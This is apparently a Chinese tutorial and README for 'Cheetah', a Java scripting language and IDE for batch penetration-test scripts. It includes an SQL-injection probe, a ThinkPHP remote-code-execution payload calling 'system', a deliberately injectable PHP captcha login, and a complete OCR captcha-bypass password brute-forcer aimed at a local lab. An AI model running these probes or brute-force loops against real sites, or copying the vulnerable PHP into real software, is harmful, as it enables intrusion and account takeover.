# Cheetah

写这个脚本语言目的是为了避免类似于python那样，即使poc和exp编写的很多，但是想要统一规范的利用（对某个站点一次性测试很多脚本）还是比较困难的，所以我就写了这个脚本语言，为的是能够更有效率的进行渗透测试。

即可以含有编程语言的灵活性，又不缺失程序框架的规范性，这是高效率的一种体现。

如何体现这两点的请继续看下面的文章。

## 程序架构

框架使用java编写，所以跨平台性比较不错，支持Windows、Linux和mac。

这个框架语言的组成含有四部分：

1. 脚本解析引擎
2. 调用脚本引擎的IDE
3. 函数功能的支持库
4. 大家一起编写的脚本

前三者都由我已经完成了，还有最后一项我也在慢慢的编写，当然大家也可以帮助我编写脚本以及函数功能的支持库（支持库的编写需要关注官方的开发者文档）

## 程序目录

大家如果进行下载，将会得到的是一个含有脚本引擎以及函数支持库的IDE。

1. config：这个目录下面是存放着GitHub配置的相关信息，如果您配置完毕GitHub仓库信息之后，会出现一个`github.info`这个文件，这个文件其实是一个java序列化的一个本地持久文件，所以如果这个文件被他人窃取可能会通过反编译我的软件得到相关的类，最终窃取你的token，千万要注意！
2. ico：这给没啥说的，就是一些图标信息
3. jar：这个是函数功能的支持库，里面会有一些按照规则写的jar包，如何编写支持库请移步到开发者官方文档，如果想要更新支持库，一是更新软件，而是在WKer的官方源中下载，切勿随意下载第三方未经授权的支持库，里面啥操作自己不去反编译也不知道，有可能会有反弹的shell，千万注意，但是Wker官方的是不会出现问题的。
4. script：这个是保存之前写好的脚本，里面是一类类的文件夹以及.wker的脚本。
5. WkerIDE.jar：这个就是主程序了，后面会详细介绍

## 程序的运行

由于使用的是动态加载支持库（实际上是动态加载jar包），java8前后的操作是不同的，虽然在程序内部做了一些判断URIClassLoader的操作，但是java8之后还是需要提供权限：

1. java8以及8之前的版本运行使用：`java -jar WkerIDE.jar -g`

2. java9以及9之之后的版本运行使用：`java --add-opens java.base/jdk.internal.loader=ALL-UNNAMED --add-opens jdk.zipfs/jdk.nio.zipfs=ALL-UNNAMED -jar WkerIDE.jar -g`

- -g参数：打开程序的gui界面

目前我也只写了这一个参数，之后程序的更新会增加许多自动化参数

程序启动界面：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332841.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

程序一启动会弹出一个检查版本信息的加载界面，这个界面不仅会加载各种支持库还有初始化GitHub信息，也会检测更新。

程序启动之后就会出现如下的界面：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331229.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

可以看到程序界面还算整洁。

## 程序界面介绍

程序一启动会出现一个实例代码：

```js
function main(args)
{
	print(" Wker is handsome !");
}
```

可以看到代码风格非常类似于js，但也有一些特点是类似于python的，为的就是能够在很短的时间内让大家熟练的使用代码（学起来很简单）。

#### 菜单栏

- 文件：里面包含了打开文件，保存文件，新建文件
- 运行：目前只提供了单独运行当前代码标签页的代码
- 设置：用来设置全局变量数组以及命令行参数和GitHub信息
- 官方源：用来打开官方信息

#### 中间部分

1. 支持库：显示当前支持库中提供的函数
2. 文件：有本地文件以及配置的GitHub仓库中的文件
   1. 双击本地文件可以在右侧的代码编辑框中进行展示
3. 右侧是一个动态多标签页的代码编辑框
   1. 这个双机标签页头部是可以进行关闭标签的

#### 底层部分

用来展示各种操作信息的

## 运行示例代码

点击：运行->开始运行。

会在控制台输出： Wker is handsome !

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331239.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

看到输出说明环境是没有什么问题的。

## 语法讲解

如果您有js和py的语言基础，那么读起Wker代码是十分简单的。

### 函数

首先我们要知道Wker语言是一门面向过程的语言，所以程序是由多个函数组成的。

函数又分为三种函数：

- 本地支持库的函数
- main函数
- 自定义函数

1. 支持库函数是由Wker官方提供的native本地函数，主要是用来提供功能接口的
2. main函数是程序运行的主函数，脚本运行就是从main函数进入的
3. 自定义函数是脚本编写者自定义的函数

#### 本地库函数

这里不详细介绍了，因为我们点击支持库的某一个库函数的时候在下方会出现相关的函数介绍，如果想要开发本地库函数可以阅读官方开发文档。

#### main函数的格式

`function main(args)`

使用关键字function关键字定义，其中args参数用来接收命令行传递过来的数组，目前命令行传递过来的数组定义暂时只能在：设置->命令函参数中进行设置，之后会推出命令行下运行的时候会直接传递进去的。

可以在main函数中使用args数组，例如：

1. 设置args数组
   - ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030814033124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

2. 打印args[0]
   - ![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030814033232.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

在这里我们也可以看到每一次执行脚本的时候都会用一个`------------------------------------------------------`分割线进行分割的。

#### 自定义函数

同样也是使用function进行定义，例如：

```js
function add(a,b)
{
	print("add函数已经运行");
	return a+b;
}

function main(args)
{
	print(add(2,3));
}
```

我们定义了一个add函数，add函数显示print了一行字，然后返回了a+b的值，我们在主方法中打印了add(2,3)的值，最终程序的运行结果：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331741.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

可以看到我们输出的结果和想象中的并不是完全一样，哪里不一样呢？我们应该输出5，但我们输出了5.0。这是因为Wker语言没有类别区分，为了兼容性所以全部的数值结算的结果都是小数，那么我们如何得到一个整数的结果呢？我们可以使用库函数：`ToInt`进行转换：

```js
print(ToInt(add(2,3)));
```

最终执行的结果：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332859.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

这样子们的小数部分就不存在了。

### 数据类型

Wker语言的数据形式有三种：

- 变量
- 数组

数据类型的话呢：

- 文本
- 小数
- 对象

这里称之为对象其实并不是十分准确，这里称为句柄可能会更加的准确一些，但是为了帮助大家理解还是称之为数组吧。

#### 变量的声明

可以使用`var`进行声明，也可以不进行声明直接进行赋值，例如：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331491.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

可以看到没有进行变量声明也是可以的。

但是有一点注意，如果变量没有被赋值，如果直接使用的话呢，解析引擎会爆出not found的错误！

#### 数组的声明

可以用`array`进行声明，当然也可以不声明直接使用，例如：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331598.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

可以看到我们使用ArrayAddEle函数向数组添加了一个值，最终将数组返回。

#### 对象的使用

暂时来说对于用户无法直接声明一个对象，对象其实在Wker中是一个句柄，通过这个句柄可以操作特定的对象，例如在ObjectLibrary这个支持库中导出的HashMap系列函数，就是典型的例子：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331725.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

可以看出我们通过hashmap进行键值对的操作，但是有一点注意，我在开发支持库的时候我不小心将hash打成了hasp，哈哈，下次更新支持库的时候再说吧！

### 返回值

返回值类型：

1. 变量
2. 数组
3. 对象

#### 变量的返回

这个很简单，和常规的返回是一样的：

```js
function add(a,b)
{
	print("add函数已经运行");
	return a+b;
}
```

#### 数组的返回

这个在上面的数组的使用中已经用到了数组的返回，其实和变量的返回没有什么区别，只不过是返回了一个数组罢了。

#### 对象的返回

也是同样的，给大家看个例子大家就知道了：

```js
function GetHash()
{
	a = GetHaspMap();
	SetHaspMapValue(a,"Wker","Good");
	print(GetHaspMapValue(a,"Wker"));
	return a;
}

function main(args)
{
	print(GetHaspMapValue(GetHash(),"Wker"));
}
```

可以看到，我们定义了GetHash()函数，用来得到一个hashmap对象。

### 数据控制操作符

Wker语言有五种操作符

1. +
2. -
3. *
4. /
5. .

和你看到的一样+-*/没有什么好说的，但是注意的是只能操作变量或者数组元素（是整数的），而`.`这个操作符用来连接字符串的。

例如：

```js
function main(args)
{
	print("a"."b");
}
```

可以打印出ab。

### 条件操作符

1. `>`
2. `<`
3. `<=`
4. `>=`
5. `==`
6. `!=`

如上述所表述，前四种易于理解，无非就是比较大小的操作符。

第五种是表示两个数据相等（可以是数组也可是字符串）

第六种是表示两个数据不相等（可以是数组也可是字符串）

### 操作符优先级

非常可惜的是，在Wker语言中我并没有提供优先级，也就是说没有优先级，但是如何让Wker拥有优先级呢？很简单，那就是括号，虽然操作符没有优先级，但是括号是有的，任何在`()`中的都是优先进行运算的。

### 语法逻辑

目前Wker语言只提供了两个语法逻辑，因为其他的逻辑语法都是这两个的衍生品。

- if - else
- while

一个用来控制流程走向的，一个用来控制循环操作的。

#### if - else

基本的流程控制语句，也就是满足情况执行什么，不满足情况的时候执行什么。

这里举个例子大家就清楚了。

```js
function main(args)
{
	a = 15;
	if(a>10)
	{
		print("变量a大于10");
	}else
	{
		print("变量a不大于10");
	}
}
```

最终在命令行打印出：`变量a大于10`

#### while

循环语句，这个是用来在情况满足时循环执行某一段程序，在情况不满足时跳出。

例如如下代码：

```js
function main(args)
{
	a = 15;
	while(a >10)
	{
		print(ToInt(a));
		a = a-1;
	}
}
```

上面这段代码打印的结果：

```
15
14
13
12
11
```

循环执行了五次就跳出了循环。

##### continue

这个是在while循环中跳到循环结尾的一个语句，当满足一定的情况可以使用`continue`跳到循环的结尾，将上面的while循环稍作顺序调整和改变:

```js
function main(args)
{
	a = 15;
	while(a >10)
	{
		a = a-1;
		if(a>12)
		{
			continue;
		}
		print(ToInt(a));
	}
}
```

最终打印出来的结果：

```js
12
11
10
```

大家可以自己仔细考虑一下为什么只打印出了这三个。

##### break

这个是在while循环中跳出循环的一个语句，当满足一定的情况可以使用`continue`跳出循环，将上面的while循环稍作顺序调整和改变:

```js
function main(args)
{
	a = 15;
	while(a >10)
	{
		a = a-1;
		if(a<12)
		{
			break;
		}
		print(ToInt(a));
	}
}
```

最终打印的结果：

```
14
13
12
```

大家可以自己仔细考虑一下为什么只打印出了这三个。

### 全局变量与全局数组

#### 全局变量

全局变量分为两种，一种是相对于IDE的全局变量，针对于所有脚本，另一种是针对于当前脚本（这个可以认为是常量会更好）

先讲第二种针对于本脚本的

##### #define定义

当我们想要使用`""`这样子的字符的时候我们会比较麻烦，所以我们最好使用宏定义会比较简单，看如下例子：

```js
#define Wker = "good"

function main(args)
{
	print(Wker);
}
```

最终将会打印出：`"good"`，这个比较好理解，并且可以看到`#define`定义的常量是不受限于`""`的，所以我们可以输入一些相对于复杂的字符，但是`\r\n`是不可以的，如果想得到换行的话呢，你可以使用库函数：`StrRN`得到一个换行。

##### IDE全局变量

这个针对于所有脚本的，我们可以通过打开：设置->全局变量进行设置：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331315.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

让后我们执行下面这段代码：

```js
function main(args)
{
	print(test);
}
```

最终是可以打印出Wker的，并且你再新建一个临时文件也是可以使用test这个变量的。

#### 全局数组

全局数组的定义是只有一种的，我们可以通过打开：设置->全局数组进行设置

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331729.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

然后我们执行下面这段代码：

```js
function main(args)
{
	print(ws[0]);
	print(ws[1]);
	print(Wker[0]);
	print(Wker[0]);
}
```

最终可以得到结果：

```
000
111
222
222
```

#### #request

这个不是赋值，而是一个必须请求。在我们想要得到一个指定变量的时候使用，例如我现在要用户必须提供给我一个名称为url的一个变量，否则不可以运行，我们可以使用`#request url = var`，如果我们没有赋值url，然后运行了脚本，那么脚本解析器会提示：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332354.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

这个在之后的批量运行时是十分重要的！

虽然们可以使用`input`库函数从命令行得到输出结果，但是这并不是一个框架性质的做法，所以建议使用`#request`来从全局中得到值，当然`#request`可以是`var`也可以是`array`！

#### #include

可以使用#include包含已经写好的脚本（调入已经写好的函数，让代码更有层次化），可以使用绝对路径，也可是相对于script的相对路径。

例：

```js
#include ATTACKUTILS/SQLAttack.wker
```


### 注释

#### 单行注释

使用`//`在代码的最后，可以随意填写你觉得可以帮助到你的内容

#### 多行注释

使用

```js
/*

*/
```

可以添加多行注释，里面可以填写可以帮助理解的内容

### 小例子（SQL注入点检测）

```js
#request url = var

function main(args)
{
	source = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	right = HttpGet(url."%20and%201=1","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	wrong = HttpGet(url."%20and%201=2","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	if(GetStrLength(source[0]) == GetStrLength(right[0]))
	{
		if(GetStrLength(wrong[0]) != GetStrLength(right[0]))
		{
			print(url."   have sql");
		}else
		{
			print(url."   no have sql");
		}
	}else
	{
		print(url."   no have sql");
	}
}
```

通过这段代码可以从用户输入的url变量中进行获取连接，然后通过HttpGet得到页面代码，最终通过比较判断是否存在SQL注入漏洞，其实也就是一个简单的if - else逻辑判断。

从这一点也不难看出Wker语言有程序的灵活性也有框架的规范性。

不难想象我们可以通过编写一些获取全局url变量（全局url数组也可以）判断漏洞的脚本然后大批量同时执行。

## 配置GitHub仓库

写好脚本之后我们通常是存放到本地，但是这样子的方式往往会让我们的脚本丢失，所以将脚本存储到云端是一个更好的选择，那么GitHub将会是我们比较好的免费选择项目，所以Wker也想到了这一点，在程序的内部增加了脚本更新到GitHub的功能，虽然现在还是不是十分只能需要手动提交，但是之后将会推出更加完善的功能。

### 申请GitHub仓库

首先我们需要有一个GitHub的账号，然后访问https://github.com/new新建一个仓库，选择的时候最好选择public公开的方式，其他的也都就不是那么重要了，申请好之后，我们需要再次申请一个token用来连接我们的GitHub仓库。

### 创建token

访问：https://github.com/settings/tokens/new，来添加一个token令牌，这个令牌需要注意的是，申请之后他会显示你的token，这个一定要记好，以防之后忘记，因为之后GitHub将不会显示给你这个token了，权限的话呢看着给，要能够上传下载更新删除就可以了，我的话呢一般都是全部勾选，比较懒哈哈。

### 配置GitHub到Wker

点击设置->GitHub仓库设置

输入您的账号名称，然后点击获取仓库：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331401.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

我们选择刚才的仓库，我这里选择Demo，然后在下方输入您的Token，然后点击确定：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331480.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

然后我们就可以看到我们的GitHub仓库的文件了，这个时候我们就可以有点GitHub仓库中的项目进行下载，然后点击本地文件的项目进行上传更新到仓库：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332464.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

然后我们就可以到仓库中进行查看：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331624.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

如果下载的话呢就右键点击下载的项目下载就好了，并且因为保存了信息，所以在之后每次打开Wker的时候都是会自动登录GitHub的。

### 可能出现的问题

因为最近GitHub貌似受到了DNS污染的攻击，所以raw.githubusercontent.com这个域名可能访问不了，我们需要在hosts文件中进行配置：

在C:\Windows\System32\drivers\etc\hosts这个文件中加入：

`199.232.96.133 raw.githubusercontent.com`

199.232.96.133是你在www.ipaddress.com查询的结果。

Linux和macOS下也是修改host，这里过多赘述。

### 官方源

可以通过访问https://github.com/Wker666/Demo获取到更多的支持库以及脚本，虽然现在我还没有更新上去，哈哈！

## 配套工具

在我上传的文件中我们随之上传两个小工具。

1. cmsSearch：用来扫描网站用到的cms
   - `java -jar Wker_CMSSearch.jar http://www.xxx.com`不要删除cms文件夹下面的CMS.csv那个是本地的指纹库。工具会联网查找也会本地扫描。

2. EXPSearch：用来在exploit-db上面提取漏洞的
   - `java -jar WKer_EXPSearch.jar`程序生成的扫描信息结果会放在data目录下，有漏洞信息和poc或exp。

## V1.2新版本

这次版本更新其实没有太多的变化，主要是修复了之前的一些bug，以及增加了一些方便的操作。

最主要的更新是增加了批量执行脚本的功能，这个功能是勾选上你需要选择执行的脚本，然后选择运行中的运行所有选中脚本。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332243.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

就可以批量执行了。

双击脚本就可以看到脚本的源代码，然后运行就可以了：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332342.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332375.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

但是漏洞探测的脚本需要注意的是，我们需要设置全局的url变量，因为：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332425.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

```js
#request url = var
#define payload = /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20wker
function main(args)
{
	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
	if(StrFindStr(res[0],"wker",0)!= "-1")
	{
		print(url."存在thinkphp远程代码执行");
	}

}
```

因为我都是使用了#request要求IDE检查是否设置了url，只有在全局变量中设置了才可以。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332624.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

这次更新我也附带了104个脚本文件，里面各式各样的脚本都有（有一些是抄的），以后也会经常更新（关注官方源）。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

当然误报是正常的，不能确定百分百的正确性，但是已经是很不错的了。

并且修复了一个github的加载bug，之前加载中文路径错误（其实是我写的时候忘记URL编码了...）现在也进行了修复。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332172.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

## V1.22

1. 更新了新特性界面
2. 增加除-g参数外的其他参数

```
usage: java -jar WkerIDE.jar -g
 -a <property=value>   全局数组设置(property=value),-aWker=God,handsome
                       -aWTL=good
 -g,--gui              打开gui界面
 -r,--run <arg>        运行脚本
 -v <property=value>   全局变量设置(property=value),-vWker=God
```

可以实现命令行直接执行脚本的需求

当然在下载文件中可以直接使用StartV1.X   当然大于1.8的要使用1.9

1. ## V1.23

   1. 修复了多支持库加载错误问题
   2. 增加了OCR识别支持库

   ### 验证码识别爆破

   在我们日常的爆破中会遇到许多阻止我们爆破的一些方式，例如：

   1. js加密
   2. 验证码
   3. ....

   js加密的话呢其实相对比较好解决，无非就是下段跟踪，没有太大的难题，但是验证码就比较麻烦了，这个是随机的，就算是人也没办法一直回答正确（今上午注册个账号，验证码搞得我直接放弃了），所以识别验证码是我们需要一起攻克的难题。

   基于图片的验证码识别其实无非就是两种：

   1. OCR的图片识别
   2. 人工智能训练好的模型

   起初我是想要实现第二种，也就是训练一个模型，但是在我训练的过程中发现java并不是是非的适合于做人工智能，训练是训练了好久，但是发现不是很理想，所以我就转到第一种OCR识别了，网上有比较成熟的库（Test4J），所以我就直接拿过来了，更新到了支持库里面：`ORCLibrary.jar`

   ### 实战

   本地搭建一个存在验证码的登录：

   首先是验证码图片展示的页面(`captcha.php`)：

   ```php
   <?php
   //向浏览器输出图片头信息
   header('Content-type:image/jpeg');
   $width=120;
   $height=40;
   $string='';//定义变量保存字体，这个一定不能省，不然回报警告
   $img=imagecreatetruecolor($width, $height);//imagecreatetruecolor函数建一个真彩色图像
   $arr=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9');
   //生成彩色像素    
   $colorBg=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//背景     imagecolorallocate函数为一幅图像分配颜色
   //填充函数，xy确定坐标，color颜色执行区域填充颜色
   imagefill($img, 0, 0, $colorBg);
   for($i=0;$i<4;$i++){
   	$string.=$arr[rand(0,count($arr)-1)];
   }
   session_start();
   $_SESSION["captcha"]=$string;
   $colorString=imagecolorallocate($img,rand(10,100),rand(10,100),rand(10,100));//文本
   //2种插入字符串字体的方式
   //imgettftext($img,字体大小（数字）,角度（数字）,rand(5,15),rand(30,35),$colorString,'字体样式的路径',$string);
   imagestring($img,5,rand(0,$width-36),rand(0,$height-15),$string,$colorString);
   //输出图片到浏览器
   imagejpeg($img);
   imagedestroy($img);
   ?>
   ```

   这个没啥太多好说的，就是生成一张验证码图片，然后将结果存储到session中，这种方法实际上是非常危险的，因为这样子会导致一个session重放的一个漏洞（验证码会失效），但是由于我们是在测试，所以暂时忽略这样子的一个问题。

   账号密码验证(`testyzm.php`):

   ```php+HTML
   <?php 
   @$a = $_POST["n"];
   @$c = $_POST["p"];
   @$yzm = $_POST["yzm"];
   if(isset($a) && isset($c) && isset($yzm)) {
   session_start();
   if(!isset($_SESSION["captcha"]))
   {
   	echo "captcha error";exit();
   }
   if($_SESSION["captcha"]!=$yzm)
   {
   	echo 'wrong captcha';
   	exit();
   }
   $b = mysql_connect("127.0.0.1",'xxx','xxx');
   mysql_select_db('fanke',$b);
   $sql = "select * from user where username='$a' and password='$c'";
   //echo $sql;
   $result = mysql_query($sql);
   if(!$result)
   {
   	die(mysql_error());
   }
   if($row = mysql_fetch_array($result)){
   	echo "success<br>";
   	echo "ID:".$row['id']."<br >";
   	echo "Ming:".$row['username']."<br >";
   	echo "mima:".$row['password']."<br >";
   }else{
   	echo "error password";
   }
   mysql_close($b);
   }else
   {?>
   <form action="testyzm.php" method="POST">
   name<input name="n" type="text" /><br><br>
   pass<input name="p" type="text" /><br><br>
   captcha<input name="yzm" type="text" /><br><br>
   <img src="captcha.php" onclick="this.src='captcha.php'" title=change"/>
   <input type="submit" value="tijiao" />
    </form>
   <?php }
   ?>
   ```

   这个也没啥，就是通过输入的信息，先判断验证码，然后SQL查询，但是这个地方存在一个SQL注入，这里我们也暂时不考虑这些问题！

   好了，到此为止我们的基础信息就已经完成了，下面我们就是要来实现爆破这个信息，这里我先事先说一下，我们的默认账号是：`admin`

   ### 爆破分析

   首先我们想要做暴力破解我们就需要来分析这个网站的一个信息，首先我们先捕获账号密码提交的HTTP数据包：

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332473.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

   是一个post封包：

   1. n为用户名
   2. p为密码
   3. yzm为验证码

   到这里我们基本上就算是了解了，但是我们还不知道关键信息

   相应结果：

   1. 密码错误响应结果：`error password`
   2. 验证码错误响应结果：`wrong captcha`
   3. 密码正确暂时不知道

   所以我们现在的逻辑就知道了，我们无非就是一个循环发送封包寻找关键字的一个程序罢了，只不过在这期间我们需要识别验证码。

   那么如何传递验证码呢？

   我们访问验证码的图片可以发现，他会响应一个session，这个session里面存储了真正的验证码结果，所以我们需要得到这个session！

   ### 编写代码

   首先我们先要能够现在下来验证码的图片，使用OCR支持库中的`DownLoadImg`库函数

   1. 第一个参数是网络图片地址
   2. 第二个参数是本地存放的路径
   3. 返回值是相应的协议头

   我们从响应头中截取关键的session，可以通过前后文本进行区分，所以我们可以编写如下的代码：

   ```javascript
   function GetPhpSession(header){
   	return GettextMiddle(header,"PHPSESSID=",";");
   }
   function GetCaptcha(path){
   	return GetPhpSession(DownLoadImg("http://127.0.0.1:8080/captcha.php",path));
   }
   ```

   这样子我们只需要调用`GetCaptcha`函数就可以下载验证码并且得到验证码的session

   得到了图片和session之后我们就需要识别验证码，发送数据包，判断响应！

   ```javascript
   function JudgeSuccess(username,password){
   	session = GetCaptcha("b.jpg");
   	captcha = ImgIdVC("b.jpg");
   	res = HttpPost("http://127.0.0.1:8080/testyzm.php","n=".username."&p=".password."&yzm=".captcha,"Cookie: PHPSESSID=".session);
   	if(StrFindStr(res[0],"wrong",0) != "-1"){
   		print("验证码错误:".captcha);
   		return 1;//验证码错误
   	}
   	if(StrFindStr(res[0],"error",0) != "-1"){
   		print("密码错误:"."用户名:".username."   密码:".password."   验证码:".captcha);
   		return 2;//密码错误
   	}
   	if(StrFindStr(res[0],"success",0) != "-1"){
   		print("爆破成功,用户名:".username."   密码:".password);
   		return 3;//账号密码正确
   	}
   }
   ```

   上面的这个函数就是用来爆破的子函数，一共做了下面的几步：

   1. 获取session和下载图片到本地的b.jpg
   2. 使用本地的`ImgIdVC`库函数识别验证码
      1. 参数一是图片的本地路径
      2. 返回值是识别的结果
   3. 发送post封包，然后保存响应的结果
   4. 判断响应中是否存在wrong，如果存在返回1，并且打印验证码错误
   5. 判断响应中是否存在error，如果存在返回2，打印出错误的信息
   6. 判断响应中是否存在success，如果存在返回3，打印出正确的账号密码（这里是我进行预测的，当然其实这个写不写都可以，如果不存在error和wrong的话呢，说明登录成功）

   爆破的子函数写完之后我们就要在main函数中进行调用：

   ```javascript
   function main(args)
   {
   	username = "admin";
   	passList = StrSplit(ReadFile("password.txt"),StrRN());
   	num = GetArrayNum(passList);
   	i = 0;
   	while(i<num){
   		res = JudgeSuccess(username,passList[ToInt(i)]);
   		if(res == 2){i = i+1;}
   		if(res == 3){break;}
   	}
   	print("爆破完毕");
   }
   ```

